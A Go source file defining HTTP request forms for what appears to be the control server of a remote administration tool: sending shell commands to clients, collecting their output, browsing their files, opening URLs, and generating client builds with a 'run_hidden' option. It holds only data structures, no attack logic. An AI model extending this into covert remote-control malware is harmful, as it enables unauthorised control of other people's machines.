package http

type SendCommandRequestForm struct {
	Address string `form:"address" binding:"required"`
	Command string `form:"command" binding:"required"`
}

type RespondCommandRequestBody struct {
	MacAddress string `json:"mac_address" binding:"required"`
	Response   []byte `json:"response"`
	HasError   bool   `json:"has_error,omitempty"`
}

type FileExplorerRequestForm struct {
	Address string `form:"address" binding:"required"`
	Path    string `form:"path"`
}

type UpdateUserPasswordRequestForm struct {
	Username    string `form:"username" json:"username,omitempty" binding:"required"`
	OldPassword string `form:"old-password" json:"old_password,omitempty" binding:"required"`
	NewPassword string `form:"new-password" json:"new_password,omitempty" binding:"required"`
}

type GenerateClientRequestForm struct {
	Address   string `form:"address"`
	Port      string `form:"port"`
	OSTarget  string `form:"os_target"`
	Filename  string `form:"filename"`
	RunHidden string `form:"run_hidden"`
}

type OpenUrlRequestForm struct {
	Address string `form:"address" binding:"required"`
	URL     string `form:"url"  binding:"required"`
}
